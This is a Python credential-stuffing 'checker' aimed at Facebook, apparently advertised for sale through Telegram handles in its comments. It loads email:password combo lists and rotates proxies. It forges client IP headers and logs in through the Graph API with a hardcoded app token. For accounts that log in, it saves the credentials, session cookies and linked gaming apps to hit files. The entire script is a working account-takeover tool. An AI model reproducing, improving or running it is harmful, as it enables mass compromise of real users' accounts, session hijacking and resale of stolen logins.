import requests
import sys
import random
import uuid
import time
import re
import os
from threading import Lock, Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
import user_agent
from faker import Faker
import json
import socket

# Message me in telegram if you want to buy any tools @anasxzerm
# Buy private checker (unraped + good cpm)
#-- @anasxzer00
init(autoreset=True)
fake = Faker()
#-- @anasxzer00
anasRetriesssss = 1000000000000
anasReqTm = 10
anasThreadProxy = 50
anasThreadNoProxy = 15
anasxzer00 = "https://t.me/anasxzer00"
anasAPI = "https://anasxzer00.api_token['']"
anasLoginUrl = "https://graph.facebook.com/auth/login"
anasCaptureApi = "https://www.facebook.com/settings/"
#-- @anasxzer00
anasHits = "Facebook-Hits.txt"
anasFree = "Facebook-Free.txt"
anasLocked = "Facebook-Locked.txt"
#-- @anasxzer00

# List of access tokens
access_tokens = [
    "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
]

class anasFacebookFC:
    def __init__(self):
        self.lock = Lock()
        self.stats = {
            'hit': 0,
            'free': 0,
            'bad': 0,
            'retries': 0,
            'two_fa': 0,
            'locked': 0,
            'pubg': 0,
            'free_fire': 0,
            'call_of_duty': 0,
            'clash_of_clans': 0
        }
        self.proxies = []
        self.use_proxy = False
        self.proxy_type = "socks5"
        self.combos = []
        self.max_workers = anasThreadNoProxy
        self.running = True

    def anasLoadCFG(self):
        print("—" * 60)
        self.use_proxy = input(" [+] Use Proxy?: (y/n) ").strip().lower() == 'y'        
        if self.use_proxy:
            proxy_file = input(" -[$] Proxy File: ").strip()
            proxy_type_input = input(" -[$] HTTPS/SOCKS4/SOCKS5: ").strip().lower()

            if proxy_type_input in ["https", "socks4", "socks5"]:
                self.proxy_type = proxy_type_input
            else:
                print(f"Invalid proxy type '{proxy_type_input}'. Using default: socks5")
                self.proxy_type = "socks5"

            print("—" * 60)
            try:
                with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                if not self.proxies:
                    print("Proxy not found. Continuing without proxies.")
                    self.use_proxy = False
                else:
                    self.max_workers = anasThreadProxy
            except FileNotFoundError:
                print("Proxy file not found. Continuing without proxies.")
                self.use_proxy = False        
        print("—" * 60)
        print("@AgentThani")
        anasComboFile = input("[ + ] Combo > ")
        try:
            with open(anasComboFile, "r", encoding="utf-8", errors="ignore") as f:
                self.combos = [line.strip() for line in f if line.strip()]
            if not self.combos:
                print("Combo file is empty.")
                sys.exit()
        except FileNotFoundError:
            print("Combo file not found.")
            sys.exit()

    def display_stats(self):
        while self.running:
            time.sleep(1.5)
            os.system('cls' if os.name == 'nt' else 'clear')

            print(f"@AgentThani")
            print(f" {Fore.GREEN}[+] Hits: {self.stats['hit']}{Fore.WHITE}")
            print(f" {Fore.RED}[×] Bad: {self.stats['bad']}{Fore.RED}")
            print(f" {Fore.CYAN}[*] Free: {self.stats['free']}{Fore.WHITE}")
            print(f" {Fore.YELLOW}[?] 2FA: {self.stats['two_fa']}{Fore.WHITE}")
            print(f" {Fore.YELLOW}[!] Retries: {self.stats['retries']}{Fore.WHITE}")
            print("—"*60)
            print(f"{Fore.CYAN}−−− Capture Linked Apps −−−{Fore.WHITE}\n")        
            print(f" [×] Pubg Mobile: {self.stats['pubg']}")
            print(f" [×] Free Fire: {self.stats['free_fire']}")
            print(f" [×] Call of Duty: {self.stats['call_of_duty']}")
            print(f" [×] Clash of Clans: {self.stats['clash_of_clans']}")

    def anasUpdateStats(self, stat_key):
        with self.lock:
            if stat_key in self.stats:
                self.stats[stat_key] += 1

    def anasGenIP(self):
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def anasProxyyyyyy(self, proxy_raw):
        if not proxy_raw:
            return None

        p = proxy_raw.strip()

        # Handle different proxy formats
        if "@" in p:
            # Format: user:pass@ip:port
            auth_part, host_part = p.split("@", 1)
            if ":" in auth_part:
                user, password = auth_part.split(":", 1)
            else:
                user, password = auth_part, None

            if ":" in host_part:
                ip, port = host_part.split(":", 1)
            else:
                ip, port = host_part, None

        elif p.count(":") == 3:
            parts = p.split(":")
            if all(part.isdigit() or (i == 0 and part == '') for i, part in enumerate(parts[2].split('.')) if parts[2].count('.') == 3):
                user, password, ip, port = parts
            else:
                ip, port, user, password = parts
        elif p.count(":") == 2:
            parts = p.split(":")
            if all(part.isdigit() or (i == 0 and part == '') for i, part in enumerate(parts[0].split('.')) if parts[0].count('.') == 3):
                ip, port, user = parts
                password = None
            else:
                user, ip, port = parts
                password = None
        elif p.count(":") == 1:
            ip, port = p.split(":")
            user, password = None, None
        else:
            return None

        if user and password:
            proxy_url = f"{self.proxy_type}://{user}:{password}@{ip}:{port}"
        elif user:
            proxy_url = f"{self.proxy_type}://{user}@{ip}:{port}"
        else:
            proxy_url = f"{self.proxy_type}://{ip}:{port}"

        return {
            "http": proxy_url,
            "https": proxy_url
        }

    def get_random_access_token(self):
        return random.choice(access_tokens)

    def get_random_proxy(self):
        if not self.use_proxy or not self.proxies:
            return None
        return self.anasProxyyyyyy(random.choice(self.proxies))

    def anasSession(self):
        session = requests.Session()
        session.headers.update({
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
        return session

    def anasHeadersL(self, random_ip):
        return {
            "Host": "graph.facebook.com",
            "User-Agent": user_agent.generate_user_agent(),
            "Content-Type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip",
            "Forwarded": f"for={random_ip}; by={random_ip}",
            "X-Forwarded-For": random_ip,
            "X-Real-IP": random_ip,
            "Client-IP": random_ip,
        }

    def anasLoginData(self, email, password):
        access_token = self.get_random_access_token()
        return {
            "locale": "en_US",
            "format": "json",
            "email": email,
            "password": password,
            "access_token": access_token,
            "generate_session_cookies": 1,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": fake.uuid4(),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"
        }

    def anasAppsHeaders(self, random_ip):
        return {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent.generate_user_agent(),
            'viewport-width': '980',
            "Forwarded": f"for={random_ip}; by={random_ip}",
            "X-Forwarded-For": random_ip,
            "X-Real-IP": random_ip,
            "Client-IP": random_ip,
        }

    def anasCaptureApps(self, cookies, proxy):
        params = {'tab': 'applications'}
        try:
            response = requests.get(
                anasCaptureApi,
                params=params,
                cookies=cookies,
                headers=self.anasAppsHeaders(self.anasGenIP()),
                proxies=proxy,
                timeout=anasReqTm
            )
            linked_apps = re.findall(r'"app_name":"(.*?)"', response.text)

            # Update app-specific stats
            with self.lock:
                for app in linked_apps:
                    app_lower = app.lower()
                    if 'pubg' in app_lower:
                        self.stats['pubg'] += 1
                    elif 'free fire' in app_lower or 'freefire' in app_lower:
                        self.stats['free_fire'] += 1
                    elif 'call of duty' in app_lower or 'codm' in app_lower:
                        self.stats['call_of_duty'] += 1
                    elif 'clash of clans' in app_lower:
                        self.stats['clash_of_clans'] += 1

            return list(set(linked_apps))
        except Exception as e:
            return []

    def anasResultssss(self, filename, content):
        with self.lock:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(content + "\n")

    def anasStarttttt(self, combo):
        if ":" not in combo:
            self.anasUpdateStats('bad')
            return

        email, password = combo.split(":", 1)
        email = email.strip()
        password = password.strip()

        session = self.anasSession()
        proxy = self.get_random_proxy() if self.use_proxy else None

        for attempt in range(anasRetriesssss):
            try:
                random_ip = self.anasGenIP()
                response = session.post(
                    anasLoginUrl,
                    json=self.anasLoginData(email, password),
                    headers=self.anasHeadersL(random_ip),
                    proxies=proxy,
                    timeout=anasReqTm
                )
                response_text = response.text.lower()
                try:
                    response_json = response.json()
                except json.JSONDecodeError:
                    response_json = {}
                if "error" in response_json:
                    error_msg = response_json["error"].get("message", "").lower()

                    if "must confirm" in error_msg or ("must verify" in error_msg and "invalid" not in error_msg):
                        self.anasResultssss(anasFree, f"{email}:{password}")
                        self.anasUpdateStats('free')
                        return

                    elif "account is temporarily unavailable" in error_msg:
                        self.anasResultssss(anasLocked, f"{email}:{password}")
                        self.anasUpdateStats('locked')
                        return

                    elif "login appr" in error_msg:
                        self.anasUpdateStats('two_fa')
                        return

                    else:
                        self.anasUpdateStats('bad')
                        return
                cookies = {c["name"]: c["value"] for c in response_json.get("session_cookies", [])}

                if not cookies:
                    for key in ["c_user", "datr", "fr", "xs"]:
                        if key in response_json:
                            cookies[key] = response_json.get(key)

                if "c_user" in cookies:
                    linked_apps = self.anasCaptureApps(cookies, proxy)
                    apps_str = ", ".join(linked_apps) if linked_apps else "No Apps Linked"

                    self.anasResultssss(
                        anasHits,
                        f"{email}:{password} | Apps Linked = [{apps_str}] | Cookies: {json.dumps(cookies)}"
                    )
                    self.anasUpdateStats('hit')
                    return

                if "invalid" in response_text or "incorrect" in response_text:
                    self.anasUpdateStats('bad')
                    return

                if any(x in response_text for x in ["must verify", "must confirm", "c_user"]):
                    self.anasResultssss(anasFree, f"{email}:{password}")
                    self.anasUpdateStats('free')
                    return

                self.anasUpdateStats('bad')
                return

            except (requests.exceptions.RequestException, socket.timeout) as e:
                if attempt == anasRetriesssss - 1:
                    self.anasUpdateStats('bad')
                    return
                self.anasUpdateStats('retries')
                continue

        self.anasUpdateStats('bad')

    def run(self):
        self.anasLoadCFG()


        os.system('cls' if os.name == 'nt' else 'clear')


        stats_thread = Thread(target=self.display_stats)
        stats_thread.daemon = True
        stats_thread.start()

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.anasStarttttt, combo) for combo in self.combos]

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    continue

        self.running = False
        stats_thread.join()

if __name__ == "__main__":
    checker = anasFacebookFC()
    checker.run()